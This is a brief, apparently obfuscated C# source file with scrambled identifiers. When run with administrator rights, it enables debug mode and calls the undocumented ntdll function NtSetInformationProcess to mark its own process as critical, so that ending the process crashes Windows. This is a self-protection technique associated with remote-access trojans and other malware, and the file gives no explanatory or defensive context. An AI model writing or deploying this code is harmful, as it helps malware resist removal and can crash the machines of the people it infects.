using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;

namespace oEqFtKwIikP;

public static class XeoQXhoaylAmH
{
	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern int NtSetInformationProcess(IntPtr RJMTusYiXx, int tSVsUSbGoPgdL, ref int PPfysMwPHltnFj, int PbvsOVgKUlMetjB);

	public static void wZVzKEwKHErLs()
	{
		if (fWxmHjTRyHW())
		{
			TaqVPwUruk();
		}
	}

	public static void TaqVPwUruk()
	{
		int PPfysMwPHltnFj = 1;
		Process.EnterDebugMode();
		NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref PPfysMwPHltnFj, 4);
	}

	public static bool fWxmHjTRyHW()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}
}
